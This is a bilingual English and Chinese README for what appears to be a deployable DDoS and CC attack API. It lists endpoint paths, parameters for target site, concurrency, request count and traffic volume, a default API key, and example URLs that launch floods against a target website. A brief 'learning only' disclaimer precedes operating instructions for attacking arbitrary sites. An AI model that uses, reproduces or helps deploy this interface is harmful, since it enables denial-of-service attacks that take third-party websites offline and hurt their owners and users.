DDoS/CC Attack Testing API

For learning and communication purposes only. Illegal use is strictly prohibited.

Usage Instructions

1. DDoS Application

If the website is deployed at xxx.cn, then the API endpoint is:
xxx.cn/ddos

Parameters:

ll = Traffic (GB)

bf = Concurrency

cs = Number of requests

wz = Target website

key = API key


Required parameters: wz and key
(Default key is 8888)

Example:
https://xxx.cn/ddos?wz=https://xxxx.cn&bf=100&cs=50&ll=1&key=8888

Explanation:
This request initiates a DDoS attack on the target website with:

Concurrency: 100

Number of requests: 50

Total traffic: 1GB


2. CC Application

If the website is deployed at xxx.cn, then the API endpoint is:
xxx.cn/cc

Parameters:

bf = Concurrency

cs = Number of requests

wz = Target website

key = API key


Required parameters: wz and key

Example:
https://xxx.cn/cc?wz=https://xxxx.cn&bf=100&cs=50&key=8888

Explanation:
This request initiates a CC attack on the target website with:

Concurrency: 100

Number of requests: 50


Note: Ensure write permissions are enabled to log API call records in JSON format.


DDoS/CC 攻击测压接口

仅供学习和交流使用，禁止用于非法用途。

使用说明

1. DDoS 应用

如果网站部署在 xxx.cn，那么接口地址为：
xxx.cn/ddos

参数说明：

ll = 流量（GB）

bf = 并发数

cs = 请求次数

wz = 目标网站

key = 密钥


必要参数： wz 和 key
（默认 key 为 8888）

示例：
https://xxx.cn/ddos?wz=https://xxxx.cn&bf=100&cs=50&ll=1&key=8888

解释：
该请求会向目标网站发起攻击：

并发数：100

请求次数：50

总流量：1GB


2. CC 应用

如果网站部署在 xxx.cn，那么接口地址为：
xxx.cn/cc

参数说明：

bf = 并发数

cs = 请求次数

wz = 目标网站

key = 密钥


必要参数： wz 和 key

示例：
https://xxx.cn/cc?wz=https://xxxx.cn&bf=100&cs=50&key=8888

解释：
该请求会向目标网站发起攻击：

并发数：100

请求次数：50


注意： 需要开启写入权限，以便在 JSON 文件中记录 API 调用日志。

